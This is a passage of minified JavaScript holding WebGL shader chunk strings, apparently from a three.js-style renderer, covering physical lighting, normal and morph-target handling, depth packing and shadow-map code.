sheenSpecular = vec3( 0.0 );\nfloat IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat r2 = roughness * roughness;\n\tfloat a = roughness < 0.25 ? -339.2 * r2 + 161.4 * roughness - 25.9 : -8.48 * r2 + 14.3 * roughness - 9.95;\n\tfloat b = roughness < 0.25 ? 44.0 * r2 - 23.7 * roughness + 3.26 : 1.97 * r2 - 3.27 * roughness + 0.72;\n\tfloat DG = exp( a * dotNV + b ) + ( roughness < 0.25 ? 0.0 : 0.1 * ( roughness - 0.25 ) );\n\treturn saturate( DG * RECIPROCAL_PI );\n}\nvec2 DFGApprox( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\tvec4 r = roughness * c0 + c1;\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\tvec2 fab = vec2( - 1.04, 1.04 ) * a004 + r.zw;\n\treturn fab;\n}\nvec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {\n\tvec2 fab = DFGApprox( normal, viewDir, roughness );\n\treturn specularColor * fab.x + specularF90 * fab.y;\n}\nvoid computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\tvec2 fab = DFGApprox( normal, viewDir, roughness );\n\tvec3 FssEss = specularColor * fab.x + specularF90 * fab.y;\n\tfloat Ess = fab.x + fab.y;\n\tfloat Ems = 1.0 - Ess;\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619;\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n}\n#if NUM_RECT_AREA_LIGHTS > 0\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.roughness;\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight;\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(\t\t0, 1,\t\t0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\t}\n#endif\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifdef USE_CLEARCOAT\n\t\tfloat dotNLcc = saturate( dot( geometry.clearcoatNormal, directLight.direction ) );\n\t\tvec3 ccIrradiance = dotNLcc * directLight.color;\n\t\tclearcoatSpecular += ccIrradiance * BRDF_GGX( directLight.direction, geometry.viewDir, geometry.clearcoatNormal, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );\n\t#endif\n\t#ifdef USE_SHEEN\n\t\tsheenSpecular += irradiance * BRDF_Sheen( directLight.direction, geometry.viewDir, geometry.normal, material.sheenColor, material.sheenRoughness );\n\t#endif\n\treflectedLight.directSpecular += irradiance * BRDF_GGX( directLight.direction, geometry.viewDir, geometry.normal, material.specularColor, material.specularF90, material.roughness );\n\treflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\t#ifdef USE_CLEARCOAT\n\t\tclearcoatSpecular += clearcoatRadiance * EnvironmentBRDF( geometry.clearcoatNormal, geometry.viewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );\n\t#endif\n\t#ifdef USE_SHEEN\n\t\tsheenSpecular += irradiance * material.sheenColor * IBLSheenBRDF( geometry.normal, geometry.viewDir, material.sheenRoughness );\n\t#endif\n\tvec3 singleScattering = vec3( 0.0 );\n\tvec3 multiScattering = vec3( 0.0 );\n\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\tcomputeMultiscattering( geometry.normal, geometry.viewDir, material.specularColor, material.specularF90, material.roughness, singleScattering, multiScattering );\n\tvec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\treflectedLight.indirectSpecular += radiance * singleScattering;\n\treflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;\n\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n}\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n}",lights_fragment_begin:"\nGeometricContext geometry;\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );\n#ifdef USE_CLEARCOAT\n\tgeometry.clearcoatNormal = clearcoatNormal;\n#endif\nIncidentLight directLight;\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\tPointLight pointLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tgetPointLightInfo( pointLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )\n\t\tpointLightShadow = pointLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\tSpotLight spotLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tgetSpotLightInfo( spotLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )\n\t\tspotLightShadow = spotLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\tDirectionalLight directionalLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tgetDirectionalLightInfo( directionalLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )\n\t\tdirectionalLightShadow = directionalLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\tRectAreaLight rectAreaLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if defined( RE_IndirectDiffuse )\n\tvec3 iblIrradiance = vec3( 0.0 );\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\tirradiance += getLightProbeIrradiance( lightProbe, geometry.normal );\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry.normal );\n\t\t}\n\t\t#pragma unroll_loop_end\n\t#endif\n#endif\n#if defined( RE_IndirectSpecular )\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearcoatRadiance = vec3( 0.0 );\n#endif",lights_fragment_maps:"#if defined( RE_IndirectDiffuse )\n\t#ifdef USE_LIGHTMAP\n\t\tvec4 lightMapTexel = texture2D( lightMap, vUv2 );\n\t\tvec3 lightMapIrradiance = lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tlightMapIrradiance *= PI;\n\t\t#endif\n\t\tirradiance += lightMapIrradiance;\n\t#endif\n\t#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )\n\t\tiblIrradiance += getIBLIrradiance( geometry.normal );\n\t#endif\n#endif\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\tradiance += getIBLRadiance( geometry.viewDir, geometry.normal, material.roughness );\n\t#ifdef USE_CLEARCOAT\n\t\tclearcoatRadiance += getIBLRadiance( geometry.viewDir, geometry.clearcoatNormal, material.clearcoatRoughness );\n\t#endif\n#endif",lights_fragment_end:"#if defined( RE_IndirectDiffuse )\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n#endif\n#if defined( RE_IndirectSpecular )\n\tRE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometry, material, reflectedLight );\n#endif",logdepthbuf_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tgl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;\n#endif",logdepthbuf_pars_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n\tvarying float vIsPerspective;\n#endif",logdepthbuf_pars_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvarying float vFragDepth;\n\t\tvarying float vIsPerspective;\n\t#else\n\t\tuniform float logDepthBufFC;\n\t#endif\n#endif",logdepthbuf_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\t\tvIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );\n\t#else\n\t\tif ( isPerspectiveMatrix( projectionMatrix ) ) {\n\t\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\t\t\tgl_Position.z *= gl_Position.w;\n\t\t}\n\t#endif\n#endif",map_fragment:"#ifdef USE_MAP\n\tvec4 texelColor = texture2D( map, vUv );\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n#endif",map_pars_fragment:"#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif",map_particle_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n#endif\n#ifdef USE_MAP\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n#endif\n#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, uv ).g;\n#endif",map_particle_pars_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tuniform mat3 uvTransform;\n#endif\n#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif\n#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",metalnessmap_fragment:"float metalnessFactor = metalness;\n#ifdef USE_METALNESSMAP\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\tmetalnessFactor *= texelMetalness.b;\n#endif",metalnessmap_pars_fragment:"#ifdef USE_METALNESSMAP\n\tuniform sampler2D metalnessMap;\n#endif",morphnormal_vertex:"#ifdef USE_MORPHNORMALS\n\tobjectNormal *= morphTargetBaseInfluence;\n\t#ifdef MORPHTARGETS_TEXTURE\n\t\tfor ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {\n\t\t\tif ( morphTargetInfluences[ i ] > 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1, 2 ) * morphTargetInfluences[ i ];\n\t\t}\n\t#else\n\t\tobjectNormal += morphNormal0 * morphTargetInfluences[ 0 ];\n\t\tobjectNormal += morphNormal1 * morphTargetInfluences[ 1 ];\n\t\tobjectNormal += morphNormal2 * morphTargetInfluences[ 2 ];\n\t\tobjectNormal += morphNormal3 * morphTargetInfluences[ 3 ];\n\t#endif\n#endif",morphtarget_pars_vertex:"#ifdef USE_MORPHTARGETS\n\tuniform float morphTargetBaseInfluence;\n\t#ifdef MORPHTARGETS_TEXTURE\n\t\tuniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];\n\t\tuniform sampler2DArray morphTargetsTexture;\n\t\tuniform vec2 morphTargetsTextureSize;\n\t\tvec3 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset, const in int stride ) {\n\t\t\tfloat texelIndex = float( vertexIndex * stride + offset );\n\t\t\tfloat y = floor( texelIndex / morphTargetsTextureSize.x );\n\t\t\tfloat x = texelIndex - y * morphTargetsTextureSize.x;\n\t\t\tvec3 morphUV = vec3( ( x + 0.5 ) / morphTargetsTextureSize.x, y / morphTargetsTextureSize.y, morphTargetIndex );\n\t\t\treturn texture( morphTargetsTexture, morphUV ).xyz;\n\t\t}\n\t#else\n\t\t#ifndef USE_MORPHNORMALS\n\t\t\tuniform float morphTargetInfluences[ 8 ];\n\t\t#else\n\t\t\tuniform float morphTargetInfluences[ 4 ];\n\t\t#endif\n\t#endif\n#endif",morphtarget_vertex:"#ifdef USE_MORPHTARGETS\n\ttransformed *= morphTargetBaseInfluence;\n\t#ifdef MORPHTARGETS_TEXTURE\n\t\tfor ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {\n\t\t\t#ifndef USE_MORPHNORMALS\n\t\t\t\tif ( morphTargetInfluences[ i ] > 0.0 ) transformed += getMorph( gl_VertexID, i, 0, 1 ) * morphTargetInfluences[ i ];\n\t\t\t#else\n\t\t\t\tif ( morphTargetInfluences[ i ] > 0.0 ) transformed += getMorph( gl_VertexID, i, 0, 2 ) * morphTargetInfluences[ i ];\n\t\t\t#endif\n\t\t}\n\t#else\n\t\ttransformed += morphTarget0 * morphTargetInfluences[ 0 ];\n\t\ttransformed += morphTarget1 * morphTargetInfluences[ 1 ];\n\t\ttransformed += morphTarget2 * morphTargetInfluences[ 2 ];\n\t\ttransformed += morphTarget3 * morphTargetInfluences[ 3 ];\n\t\t#ifndef USE_MORPHNORMALS\n\t\t\ttransformed += morphTarget4 * morphTargetInfluences[ 4 ];\n\t\t\ttransformed += morphTarget5 * morphTargetInfluences[ 5 ];\n\t\t\ttransformed += morphTarget6 * morphTargetInfluences[ 6 ];\n\t\t\ttransformed += morphTarget7 * morphTargetInfluences[ 7 ];\n\t\t#endif\n\t#endif\n#endif",normal_fragment_begin:"float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;\n#ifdef FLAT_SHADED\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n#else\n\tvec3 normal = normalize( vNormal );\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * faceDirection;\n\t#endif\n\t#ifdef USE_TANGENT\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\ttangent = tangent * faceDirection;\n\t\t\tbitangent = bitangent * faceDirection;\n\t\t#endif\n\t\t#if defined( TANGENTSPACE_NORMALMAP ) || defined( USE_CLEARCOAT_NORMALMAP )\n\t\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\t#endif\n\t#endif\n#endif\nvec3 geometryNormal = normal;",normal_fragment_maps:"#ifdef OBJECTSPACE_NORMALMAP\n\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t#ifdef FLIP_SIDED\n\t\tnormal = - normal;\n\t#endif\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * faceDirection;\n\t#endif\n\tnormal = normalize( normalMatrix * normal );\n#elif defined( TANGENTSPACE_NORMALMAP )\n\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\tmapN.xy *= normalScale;\n\t#ifdef USE_TANGENT\n\t\tnormal = normalize( vTBN * mapN );\n\t#else\n\t\tnormal = perturbNormal2Arb( - vViewPosition, normal, mapN, faceDirection );\n\t#endif\n#elif defined( USE_BUMPMAP )\n\tnormal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );\n#endif",normal_pars_fragment:"#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif",normal_pars_vertex:"#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif",normal_vertex:"#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif",normalmap_pars_fragment:"#ifdef USE_NORMALMAP\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n#endif\n#ifdef OBJECTSPACE_NORMALMAP\n\tuniform mat3 normalMatrix;\n#endif\n#if ! defined ( USE_TANGENT ) && ( defined ( TANGENTSPACE_NORMALMAP ) || defined ( USE_CLEARCOAT_NORMALMAP ) )\n\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm, vec3 mapN, float faceDirection ) {\n\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\tvec2 st0 = dFdx( vUv.st );\n\t\tvec2 st1 = dFdy( vUv.st );\n\t\tvec3 N = surf_norm;\n\t\tvec3 q1perp = cross( q1, N );\n\t\tvec3 q0perp = cross( N, q0 );\n\t\tvec3 T = q1perp * st0.x + q0perp * st1.x;\n\t\tvec3 B = q1perp * st0.y + q0perp * st1.y;\n\t\tfloat det = max( dot( T, T ), dot( B, B ) );\n\t\tfloat scale = ( det == 0.0 ) ? 0.0 : faceDirection * inversesqrt( det );\n\t\treturn normalize( T * ( mapN.x * scale ) + B * ( mapN.y * scale ) + N * mapN.z );\n\t}\n#endif",clearcoat_normal_fragment_begin:"#ifdef USE_CLEARCOAT\n\tvec3 clearcoatNormal = geometryNormal;\n#endif",clearcoat_normal_fragment_maps:"#ifdef USE_CLEARCOAT_NORMALMAP\n\tvec3 clearcoatMapN = texture2D( clearcoatNormalMap, vUv ).xyz * 2.0 - 1.0;\n\tclearcoatMapN.xy *= clearcoatNormalScale;\n\t#ifdef USE_TANGENT\n\t\tclearcoatNormal = normalize( vTBN * clearcoatMapN );\n\t#else\n\t\tclearcoatNormal = perturbNormal2Arb( - vViewPosition, clearcoatNormal, clearcoatMapN, faceDirection );\n\t#endif\n#endif",clearcoat_pars_fragment:"#ifdef USE_CLEARCOATMAP\n\tuniform sampler2D clearcoatMap;\n#endif\n#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\tuniform sampler2D clearcoatRoughnessMap;\n#endif\n#ifdef USE_CLEARCOAT_NORMALMAP\n\tuniform sampler2D clearcoatNormalMap;\n\tuniform vec2 clearcoatNormalScale;\n#endif",output_fragment:"#ifdef OPAQUE\ndiffuseColor.a = 1.0;\n#endif\n#ifdef USE_TRANSMISSION\ndiffuseColor.a *= transmissionAlpha + 0.1;\n#endif\ngl_FragColor = vec4( outgoingLight, diffuseColor.a );",packing:"vec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\nconst float ShiftRight8 = 1. / 256.;\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8;\treturn r * PackUpscale;\n}\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\nvec4 pack2HalfToRGBA( vec2 v ) {\n\tvec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );\n\treturn vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );\n}\nvec2 unpackRGBATo2Half( vec4 v ) {\n\treturn vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );\n}\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}",premultiplied_alpha_fragment:"#ifdef PREMULTIPLIED_ALPHA\n\tgl_FragColor.rgb *= gl_FragColor.a;\n#endif",project_vertex:"vec4 mvPosition = vec4( transformed, 1.0 );\n#ifdef USE_INSTANCING\n\tmvPosition = instanceMatrix * mvPosition;\n#endif\nmvPosition = modelViewMatrix * mvPosition;\ngl_Position = projectionMatrix * mvPosition;",dithering_fragment:"#ifdef DITHERING\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n#endif",dithering_pars_fragment:"#ifdef DITHERING\n\tvec3 dithering( vec3 color ) {\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\t\treturn color + dither_shift_RGB;\n\t}\n#endif",roughnessmap_fragment:"float roughnessFactor = roughness;\n#ifdef USE_ROUGHNESSMAP\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\troughnessFactor *= texelRoughness.g;\n#endif",roughnessmap_pars_fragment:"#ifdef USE_ROUGHNESSMAP\n\tuniform sampler2D roughnessMap;\n#endif",shadowmap_pars_fragment:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\t}\n\tvec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {\n\t\treturn unpackRGBATo2Half( texture2D( shadow, uv ) );\n\t}\n\tfloat VSMShadow (sampler2D shadow, vec2 uv, float compare ){\n\t\tfloat occlusion = 1.0;\n\t\tvec2 distribution = texture2DDistribution( shadow, uv );\n\t\tfloat hard_shadow = step( compare , distribution.x );\n\t\tif (hard_shadow != 1.0 ) {\n\t\t\tfloat distance = compare - distribution.x ;\n\t\t\tfloat variance = max( 0.00000, distribution.y * distribution.y );\n\t\t\tfloat softness_probability = variance / (variance + distance * distance );\t\t\tsoftness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );\t\t\tocclusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );\n\t\t}\n\t\treturn occlusion;\n\t}\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\t\tfloat shadow = 1.0;\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, 